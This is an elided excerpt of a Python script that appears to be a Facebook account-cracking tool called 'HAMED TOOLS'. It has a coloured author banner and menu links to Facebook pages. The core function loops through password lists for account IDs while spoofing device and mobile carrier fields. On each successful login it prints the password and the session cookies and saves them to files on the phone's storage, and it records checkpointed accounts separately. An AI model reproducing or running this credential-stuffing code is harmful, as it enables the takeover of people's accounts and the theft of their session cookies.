...
os.system('xdg-open https://facebook.com/groups/537983021114947//')
...
=======================================================
\033[1;31m====================================================
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mAUTHER     \033[1;31m┇\033[31;47m{HAMED}\33[0;m      
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mFACEBOOK   \033[1;31m┇\033[37;41m{HAMED Joo}\33[0;m        
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mGITHUB    \033[1;31m ┇\033[1;37m{HAMED457}\33[0;m              
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mWHATSAPP \33[1;31m  ┇\033[31;47m{+9893546007** }\33[0;m
...
\033[1;31m====================================================
\33[37;41m\t WELLCOME TO HAMED TOOLS\33[0;m
...
def FKING():
		...
		#	linex()
			...
			if jf in ['1','01']:
			 ...
			 os.system('xdg-open https://www.facebook.com/profile.php?id=100078297285634/')
			elif jf in ['3','03']:
			 os.system('xdg-open https://facebook.com/groups/537983021114947/')
			elif jf in ['0','00']:
				exit(' Thanks for use 🥰 ')
...
HAMED = [ 'MTN', 'AWCC', 'Roshan', 'Etisalat']
HAMED = random.choice(HAMED)
def fking1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[37;41m [HAMED➥]\33[0;m %s|\033[1;32mOK:-%s \033[1;31m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        fblc = device['fblc']
                        fbcr = sim_id
                        Fjj=random.choice(HAMED)
                        Fjjj=random.choice(HAMED)
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[31;47m [HAMED==>OK]\33[0;m\033[1;32m '+str(uid)+' | '+pas+'\033[1;97m')
                                        print("")
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print('\r\r\033[31;47m'"Cookie:\33[0;m\033[1;32m "+coki)
                                        open('/sdcard/HAMED-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/HAMED-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[37;41m [HAMED==>CP]\33[0;m '+str(uid)+' | '+pas+'\033[1;97m')
                                        print("")
                                        open('/sdcard/HAMED-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
